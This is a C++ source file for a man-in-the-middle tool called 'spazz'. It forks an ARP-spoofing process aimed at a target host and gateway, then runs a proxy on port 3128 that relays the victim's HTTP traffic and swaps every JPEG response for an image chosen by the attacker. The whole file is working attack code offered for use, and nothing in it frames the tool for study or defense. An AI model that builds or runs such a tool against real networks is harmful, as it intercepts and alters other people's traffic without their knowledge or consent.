#include <iostream>
#include <thread>
#include <string>
#include <vector>
#include <regex>
#include "arp.h"
#include <unistd.h>
#include "regex.hpp"
#include "network.hpp"
#include <map>

typedef std::map<std::string,std::string> headerlist;
void usage(){
    printf("Usage: ./spazz -i <device> -g <gateway ip> -t <target_ip> -j <jpeg>\n");

}
std::string mitmJpeg; 
void tokenize_headers(std::string buf,headerlist &m);

void relay_request(int sockfd,std::string method,std::string uri,headerlist headers){
    std::string hostName = headers[static_cast<std::string>("Host")];
    int ret;
    int sendsocket;
    int flags;
    std::string buf;
    headerlist responseHeaders;

    buf.resize(2048);
    sendsocket = network::connect(hostName,80);
    if( sendsocket < 0 ){
        std::cerr << "Relay request failed: " ;
        switch(sendsocket){
            case SPAZZ_SOCKET_ERROR:
                std::cerr << "Socket error\n";
                break;
            case SPAZZ_DNS_ERROR:
                std::cerr << "DNS error\n";
                break;
            case SPAZZ_CONNECT_ERROR:
                std::cerr << "Connect error\n";
                break;
        }
        return;
    }
    
    std::cout << "Forwarding request " << hostName.c_str();

    //Forward the request to the target server
    flags = fcntl (sockfd, F_GETFL, 0);
    fcntl (sockfd, F_SETFL, flags | O_NONBLOCK);
    flags = fcntl (sendsocket, F_GETFL, 0);
    fcntl (sockfd, F_SETFL, flags | O_NONBLOCK);
    
    //Forward the request headers to the remote server
    do{
        ret = recv(sockfd,&buf[0],2048,0);
        send(sendsocket,buf.c_str(),ret,0);
    }while(ret > 0);
    
    // Take a look at the response headers before forwarding
    ret = recv(sendsocket,&buf[0],2048,MSG_PEEK);
    tokenize_headers(buf,responseHeaders);
    std::string contentType = responseHeaders[static_cast<std::string>("Content-Type")];
    std::cout << "Content-Type: " << contentType.c_str() << "\n";
    if( contentType == "image/jpeg" ){
        std::cout << "Mangling image/jpeg request\n";
        if( network::serveJpeg( sockfd, mitmJpeg ) < 0 ){
            std::cerr << "Error serving mangled jpeg response\n";
        }else{
            std::cout << "Mangled jpeg served successfully\n";
        }
    }else{
    //Forward the response back to the user
        do{
            ret = recv(sendsocket,&buf[0],2048,0);
            if( ret )
                send(sockfd,buf.c_str(),ret,0);
        }while(ret > 0);
    }
    close(sockfd);
    close(sendsocket);
}

void tokenize_headers(std::string buf,headerlist &m){
    std::size_t pos,end;
    std::regex r("^([^:]+): ([^\r]+)\r\n");
    std::smatch matches;

    pos = buf.find("\r\n",0);    
    if( pos == std::string::npos ){
        return;
    }
    do{
        buf = buf.substr(pos + 2,buf.length() - pos + 2);
        if( regex_search(buf,matches,r) ){
            m[matches[1].str()] = matches[2].str();
        }
        pos = buf.find("\r\n");
        if( buf[pos+2] == '\r' && buf[pos+3] == '\n' ){
            break;
        }
    }while(pos != std::string::npos );
}

void handle_conn(int sockfd){
    std::cout << "Socket descriptor: " << sockfd << "\n";
    int ret;
    std::string buf;
    std::size_t index;
    headerlist headers;    
    std::string hostName,host = "Host";
    buf.resize(2048);
    ret = recv(sockfd,&buf[0],2048,MSG_PEEK);
    
    try{
        std::regex req ("([A-Z]{3,4}) ([^ ]+) HTTP/(\\d\\.\\d)");
        std::smatch matches;
        if( regex_search(buf,matches,req) ){
            if( matches.size() > 1 && matches[1].matched ){
                if( matches[1] == "GET" ){
                }else if( matches[1] == "POST" ){
                }else{
                }
                tokenize_headers(buf,headers);
                hostName = headers[host];
                relay_request(sockfd,matches[1],matches[2],headers);
            }
        }else{
            std::cout << "Unrecognized header request\n";
        }
    }catch(std::regex_error re){
        std::cerr << "Regex error: " << re.what() << "\n";
        print_regex_error(re.code());
    }
    std::cout << "thread exit\n";
}

std::vector<std::thread*> thread_list;

int main(int argc,char** argv){
    char errbuf[LIBNET_ERRBUF_SIZE];
    char c;
    char* target_ip;
    char* gateway_ip;
    char* device;
    int ret;
    pid_t pid;
    int test_socket_server = 0;

    if( argc < 6 ){
        usage();
        return 0;
    }
    while((c=getopt(argc,argv,"i:t:g:sj:")) != -1){
        switch(c){
            case 'i':
                device = optarg;
                break;
            case 't':
                target_ip = optarg;
                break;
            case 'g':
                gateway_ip = optarg;
                break;
            case 's':
                test_socket_server = 1;
                break;
            case 'j':
                mitmJpeg = optarg;
                break;
            default:
                fprintf(stderr,"Unrecognized option: -%c\n",c);
                return -2;
        }
    }

    pid = fork();
    if( pid == 0 ){
        if( test_socket_server != 1 ){
            start_arp_spoof(device,target_ip,gateway_ip);   
        }
    }else{
        //start_mangling_proxy(device);
        //cleanup_arp_spoof();
        int sock_fd;
        struct sockaddr_in servaddr,cliaddr;
        int s;
        socklen_t clilen;
        sock_fd = socket (PF_INET, SOCK_STREAM, 0); 
        if (sock_fd < 0){ 
            std::cerr << "Invalid socket\n";
            return -1; 
        }   
        servaddr.sin_family = AF_INET;
        servaddr.sin_port = htons (3128);
        servaddr.sin_addr.s_addr = htonl (INADDR_ANY);
        if (bind (sock_fd, (struct sockaddr *) &servaddr, sizeof (servaddr)) < 0){ 
            std::cerr << "Invalid bind call\n";
            return -2; 
        }   
        if( listen(sock_fd,5) < 0 ){
            return -1; 
        }   
        clilen = sizeof(cliaddr);
        while(1){
            s = accept(sock_fd, (struct sockaddr *)&cliaddr, &clilen);
            if (s < 0){
                return -2;
            }
            std::cout << "Accepted connection\n";
            thread_list.push_back(new std::thread(handle_conn,s));
        }
    }
bad:
    return EXIT_FAILURE;
}

/* EOF */
